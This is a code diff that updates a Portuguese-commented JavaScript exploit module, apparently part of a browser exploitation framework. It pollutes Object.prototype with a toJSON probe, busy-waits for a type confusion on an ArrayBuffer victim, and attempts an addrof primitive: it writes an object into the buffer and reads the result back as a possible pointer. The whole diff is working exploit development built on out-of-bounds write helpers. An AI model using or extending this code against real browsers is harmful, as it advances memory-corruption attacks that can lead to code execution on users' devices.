@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (V5 - Sonda Mais Direta)
+// js/script3/testArrayBufferVictimCrash.mjs (V6 - Sonda com Busy Wait e Re-check)
 import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
@@ -6,38 +6,40 @@ import {
     oob_array_buffer_real,
     oob_write_absolute,
     clearOOBEnvironment,
-    isOOBReady // Adicionado para checagem
+    isOOBReady
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V5_DirectProbe";
+export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V6_BusyWaitProbe";
 
 const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
 const VICTIM_AB_SIZE = 64;
 
-let toJSON_call_details_v28 = null; // Objeto global para detalhes da sonda
+let toJSON_call_details_v28 = null;
 let object_to_leak_for_addrof_attempt = null;
 let victim_ab_ref_for_original_test = null;
 
 export async function executeArrayBufferVictimCrashTest() {
     const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (Base Original) e Tentativa de Addrof com Sonda Mais Direta ---`, "test", FNAME_CURRENT_TEST);
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug com Sonda Busy Wait/Re-check ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
-    // Resetar a variável global no início de cada teste
     toJSON_call_details_v28 = {
-        probe_variant: "V5_DirectProbe",
+        probe_variant: "V6_BusyWaitProbe",
         type_observed_in_probe: "N/A",
+        initial_type_in_probe: "N/A",
+        final_type_before_write_in_probe: "N/A",
         error_in_toJSON: null,
         probe_called: false,
         addrof_write_attempted: false,
-        addrof_write_succeeded_assumption: false // Novo: para indicar se a escrita pode ter funcionado
+        addrof_write_succeeded_assumption: false,
+        busy_wait_loops: 0
     };
     victim_ab_ref_for_original_test = null;
-    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V5_DirectProbe" };
+    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V6_BusyWait" };
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
-    const fill_pattern_v5 = 0.123456789101112;
+    const fill_pattern_v6 = 0.123456789101112;
 
     let addrof_result = {
         success: false,
@@ -50,7 +52,7 @@ export async function executeArrayBufferVictimCrashTest() {
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) { // Checagem mais robusta
+        if (!isOOBReady()) {
             throw new Error("OOB Init falhou ou buffer não está pronto.");
         }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
@@ -64,7 +66,7 @@ export async function executeArrayBufferVictimCrashTest() {
 
         victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
         let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
-        float64_view_on_victim.fill(fill_pattern_v5);
+        float64_view_on_victim.fill(fill_pattern_v6);
 
         logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}.`, "test", FNAME_CURRENT_TEST);
 
@@ -74,55 +76,65 @@ export async function executeArrayBufferVictimCrashTest() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: function ProbeCoreExploit_V5_toJSON() {
-                    // ATENÇÃO: Modificar toJSON_call_details_v28 aqui DENTRO da função.
-                    // Não reatribuir toJSON_call_details_v28 = { ... } aqui, pois isso cria uma var local na sonda.
+                value: function ProbeCoreExploit_V6_toJSON_BusyWait() {
                     toJSON_call_details_v28.probe_called = true;
-                    toJSON_call_details_v28.probe_variant = "V5_DirectProbe_Executed"; // Confirmar execução
+                    toJSON_call_details_v28.probe_variant = "V6_BusyWaitProbe_Executed";
+                    let currentType = "";
 
                     try {
-                        if (this === victim_ab_ref_for_original_test && object_to_leak_for_addrof_attempt) {
-                            logS3(`[ProbeCoreExploit_V5_toJSON] Tentando escrita de addrof em this[0]...`, "warn");
-                            this[0] = object_to_leak_for_addrof_attempt; // Tenta a escrita
-                            toJSON_call_details_v28.addrof_write_attempted = true;
-                            logS3(`[ProbeCoreExploit_V5_toJSON] Escrita (supostamente) realizada. Verificando tipo de 'this'...`, "info");
+                        toJSON_call_details_v28.initial_type_in_probe = Object.prototype.toString.call(this);
+                        logS3(`[Probe_V6_BusyWait] Tipo INICIAL de 'this': ${toJSON_call_details_v28.initial_type_in_probe}`, "leak");
 
-                            // Verifica o tipo DEPOIS da tentativa de escrita
-                            toJSON_call_details_v28.type_observed_in_probe = Object.prototype.toString.call(this);
-                            logS3(`[ProbeCoreExploit_V5_toJSON] Tipo de 'this' APÓS tentativa de escrita: ${toJSON_call_details_v28.type_observed_in_probe}`, "leak");
+                        // Busy wait loop - MUITO CUIDADO, pode congelar o navegador.
+                        // Tentar por um máximo de ~10-15ms em pequenos incrementos.
+                        const maxBusyWaitDuration = 15; // ms
+                        const busyWaitCheckInterval = 1; // ms - não faz sentido ser menor que a precisão do Date.now()
+                        let busyWaitLoops = 0;
+                        const startTime = Date.now();
+                        let typeChangedToObject = false;
 
-                            // Se a escrita não causou erro e o tipo é objeto, podemos ter mais confiança
-                            if (toJSON_call_details_v28.type_observed_in_probe === '[object Object]') {
-                                toJSON_call_details_v28.addrof_write_succeeded_assumption = true;
-                                logS3(`[ProbeCoreExploit_V5_toJSON] 'this' é [object Object] após escrita. Bom sinal.`, "vuln");
+                        while(Date.now() - startTime < maxBusyWaitDuration) {
+                            busyWaitLoops++;
+                            currentType = Object.prototype.toString.call(this);
+                            if (currentType === '[object Object]') {
+                                typeChangedToObject = true;
+                                break;
                             }
+                            // Pequena pausa síncrona (busy wait)
+                            // Não usar await PAUSE_S3 aqui, pois toJSON é síncrono
+                            let spinStartTime = Date.now();
+                            while(Date.now() - spinStartTime < busyWaitCheckInterval) { /* spin */ }
+                        }
+                        toJSON_call_details_v28.busy_wait_loops = busyWaitLoops;
+                        toJSON_call_details_v28.final_type_before_write_in_probe = currentType;
+                        logS3(`[Probe_V6_BusyWait] Após busy wait (${busyWaitLoops} loops, ${Date.now() - startTime}ms), tipo FINAL de 'this': ${currentType}`, "leak");
+
+                        if (this === victim_ab_ref_for_original_test && typeChangedToObject && object_to_leak_for_addrof_attempt) {
+                            logS3(`[Probe_V6_BusyWait] HEISENBUG CONFIRMADA como [object Object]! Tentando escrita de addrof...`, "vuln");
+                            this[0] = object_to_leak_for_addrof_attempt;
+                            toJSON_call_details_v28.addrof_write_attempted = true;
+                            logS3(`[Probe_V6_BusyWait] Escrita (supostamente) realizada.`, "info");
+                            toJSON_call_details_v28.addrof_write_succeeded_assumption = true; // Assumindo que a escrita funcionou se não houve erro
                         } else {
-                             logS3(`[ProbeCoreExploit_V5_toJSON] Condição para escrita não atendida (this não é victim_ab ou objeto alvo é null).`, "info");
+                            logS3(`[Probe_V6_BusyWait] Condição para escrita não atendida. Tipo final: ${currentType}, É vítima: ${this === victim_ab_ref_for_original_test}`, "warn");
                         }
-                    } catch (e_write) {
-                        toJSON_call_details_v28.error_in_toJSON = `WriteAttempt: ${e_write.name}: ${e_write.message}`;
-                        logS3(`[ProbeCoreExploit_V5_toJSON] ERRO durante tentativa de escrita em this[0]: ${e_write.message}`, "error");
-                        // Mesmo com erro na escrita, ainda é útil saber o tipo
-                        try {
-                           toJSON_call_details_v28.type_observed_in_probe = Object.prototype.toString.call(this);
-                           logS3(`[ProbeCoreExploit_V5_toJSON] Tipo de 'this' APÓS ERRO na escrita: ${toJSON_call_details_v28.type_observed_in_probe}`, "leak");
-                        } catch (e_type) {
-                            logS3(`[ProbeCoreExploit_V5_toJSON] ERRO ao obter tipo de 'this' após erro na escrita: ${e_type.message}`, "error");
-                             toJSON_call_details_v28.type_observed_in_probe = "Error getting type after write error";
-                        }
+                    } catch (e_probe) {
+                        toJSON_call_details_v28.error_in_toJSON = `ProbeError: ${e_probe.name}: ${e_probe.message}`;
+                        logS3(`[Probe_V6_BusyWait] ERRO na sonda: ${e_probe.message}`, "error");
                     }
-                    return { probe_V5_executed: true, attempted_write: toJSON_call_details_v28.addrof_write_attempted };
+                    // Registrar o tipo final observado na sonda, independentemente do caminho
+                    toJSON_call_details_v28.type_observed_in_probe = toJSON_call_details_v28.final_type_before_write_in_probe || toJSON_call_details_v28.initial_type_in_probe;
+                    return { probe_V6_executed: true, attempted_write: toJSON_call_details_v28.addrof_write_attempted, type_final: toJSON_call_details_v28.type_observed_in_probe };
                 },
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com sonda V5 (tentativa direta de escrita).`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com sonda V6 (Busy Wait).`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);
 
             logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            // Logar o objeto global toJSON_call_details_v28 que foi modificado pela sonda
             logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
             if (toJSON_call_details_v28 && toJSON_call_details_v28.addrof_write_attempted) {
@@ -138,7 +150,7 @@ export async function executeArrayBufferVictimCrashTest() {
                 addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                 logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
 
-                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v5) > 1e-9 &&
+                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v6) > 1e-9 &&
                     (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result.success = true;
@@ -156,6 +168,7 @@ export async function executeArrayBufferVictimCrashTest() {
             } else {
                 addrof_result.message = "Escrita para addrof não foi marcada como tentada pela sonda.";
                 if(toJSON_call_details_v28 && toJSON_call_details_v28.error_in_toJSON) addrof_result.message += ` Erro na sonda: ${toJSON_call_details_v28.error_in_toJSON}`;
+                else if (toJSON_call_details_v28 && toJSON_call_details_v28.final_type_before_write_in_probe !== '[object Object]') addrof_result.message += ` Tipo final na sonda: ${toJSON_call_details_v28.final_type_before_write_in_probe}.`;
                 logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                 document.title = `${FNAME_MODULE_V28}: AddrWrite SKIPPED`;
             }
@@ -192,7 +205,7 @@ export async function executeArrayBufferVictimCrashTest() {
         errorOccurred: errorCapturedMain,
         potentiallyCrashed: false,
         stringifyResult: stringifyOutput,
-        toJSON_details: toJSON_call_details_v28, // Retorna o objeto global modificado pela sonda
+        toJSON_details: toJSON_call_details_v28,
         addrof_attempt_result: addrof_result
     };
 }
